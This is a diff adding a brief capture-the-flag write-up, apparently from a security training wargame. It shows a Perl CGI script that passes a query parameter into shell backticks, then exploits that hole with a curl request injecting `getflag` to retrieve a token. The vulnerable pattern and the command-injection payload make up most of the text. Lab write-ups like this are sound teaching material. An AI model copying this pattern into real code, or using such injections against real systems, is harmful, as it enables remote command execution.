@@ -1,0 +1,28 @@
+$ cat level04.pl
+#!/usr/bin/perl
+# localhost:4747
+use CGI qw{param};
+print "Content-type: text/html\n\n";
+sub x {
+  $y = $_[0];
+  print `echo $y 2>&1`;
+}
+x(param("x"));
+
+we can see there is something on the 4747
+
+$ curl localhost:4747
+
+do a /n
+
+curl localhost:4747?=coucou
+do the same
+
+we can see in the perl script x(param("x"));
+so we try to post a x 
+$ curl localhost:4747?x=coucou
+coucou
+then ..
+$ curl localhost:4747?x=\`getflag\`
+Check flag.Here is your token : ne2sea........
+
